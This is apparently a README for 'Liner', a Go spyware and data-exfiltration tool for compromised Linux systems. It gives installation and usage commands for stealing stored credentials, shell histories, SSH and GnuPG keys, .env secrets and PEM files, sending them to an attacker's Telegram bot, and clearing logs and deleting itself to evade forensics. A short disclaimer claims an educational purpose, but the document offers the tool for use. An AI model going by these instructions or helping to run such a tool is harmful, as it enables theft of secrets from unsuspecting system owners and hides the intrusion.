##  Liner - Post-Exploitation Data Exfiltration Tool via Telegram

**Liner** is a lightweight post-exploitation utility designed for rapid data collection and exfiltration from compromised Linux systems.  
It targets sensitive artifacts such as credentials, session tokens, private keys, and developer secrets, packaging and transferring them securely via Telegram bot API.

Built in Go, it supports silent operation, automated cleanup, and concurrent file transmission — making it ideal for stealthy, fast, and low-noise data exfiltration in red team operations or adversary simulation.

> ⚠️ **Disclaimer:** This tool is intended **strictly for educational and authorized security testing**. Unauthorized use is illegal and unethical.

---

### 🔧 Features

- Collects a wide range of sensitive files:
  - Stored credentials, shell histories, SSH keys, GnuPG data, API tokens, `.env` secrets, and more.
- Generates full directory tree structure for reconnaissance and documentation purposes.
- Compresses and optionally splits collected data for optimized transfer.
- Sends exfiltrated data directly to a specified Telegram chat using a bot token.
- Supports:
  - **Silent execution** (`--silent`) to suppress terminal output.
  - **Self-deletion** of the binary after successful execution to minimize footprint.
  - **Concurrent uploading** to accelerate data transmission under rate-limited environments.

---

### 📦 Requirements

Install required packages:

```bash
sudo apt install zip coreutils tree
```

Also required:

- A **Telegram bot token** ([@BotFather](https://t.me/BotFather))
- A **Telegram chat ID** (user or group)

---

### 🚀 Installation

```bash
git clone https://github.com/Nowafen/liner.git
cd liner
go build -v -o liner ./cmd

mv liner /usr/bin
chmod +x /usr/bin/liner

```

Verify installation:

```bash
liner --version
# Output: Liner version: x.x
```

---

### 🛠️ Usage

Basic syntax:

```bash
liner --mode Spyware --dump <TYPE> --token <TOKEN> --id <CHAT_ID> [options]
```

#### Required Flags

- `--mode Spyware` (only mode supported for now)
- `--dump`:  
  - `Credentials`: .git-credentials, keyrings  
  - `Password`: .bash_history, .zsh_history  
  - `Session`: .ssh, .gnupg  
  - `privateDATA`: *.env, *.pem, secrets  
  - `all`: Everything above
- `--token`: Your Telegram bot token
- `--id`: Telegram chat ID

#### Optional Flags

- `--silent`: Suppress all output
- `--version`: Show current version
- `--update`: Check for new version
- `--help`: Show help message

---

### 💡 Examples

```bash
sudo liner --mode Spyware --dump Password --token <BOT_TOKEN> --id <CHAT_ID>
```

```bash
sudo liner --mode Spyware --dump all --token <BOT_TOKEN> --id <CHAT_ID> --silent
```

---

### 🧠 How It Works

1. **Environment Validation:**  
   Ensures the target system is Linux-based before proceeding.

2. **Targeted Data Collection:**  
   Retrieves files based on the selected `--dump` category (e.g., credentials, sessions, secrets).

3. **Filesystem Mapping:**  
   Executes a recursive directory scan using `tree` to provide structural context.

4. **Data Packaging:**  
   Archives all collected data into `liner_data.zip`.  
   - If total size exceeds 48MB, archive is split into 25MB chunks for reliable transfer.

5. **Stealth Exfiltration via Telegram:**  
   Sends an initial message, directory map, and zipped payload to the configured Telegram chat using the bot API.

6. **Cleanup & Evasion:**  
   Removes temporary artifacts, clears relevant logs, and optionally self-deletes the binary to minimize forensic traces.

---

### ⚙️ Troubleshooting

- **Upload fails with `429 Too Many Requests` or times out?**  
  Telegram may be throttling API requests. Try reducing the upload concurrency in `core/telegram.go` or increase delay between sends.

- **No data received in chat?**  
  Ensure:
  - You are using a valid `--token` and `--id`
  - The specified `--dump` target contains data
  - Sufficient permissions (`sudo`) are granted

- **Split archive reassembly (receiver side):**

```bash
cat part_* > liner_data.zip
unzip liner_data.zip
```
---

### 👨‍💻 Contributing

Pull requests and issues are welcome. Let’s improve this project together.


### 📜 License

This project is **proprietary and closed-source**.  
All rights reserved © 2025 [MNM]  
Unauthorized copying, distribution, or modification of any part of this codebase is strictly prohibited.

For collaboration or usage inquiries, please contact: [https://t.me/mnmsec]



// Developed by [MNM]
// Uploaded: July 2025

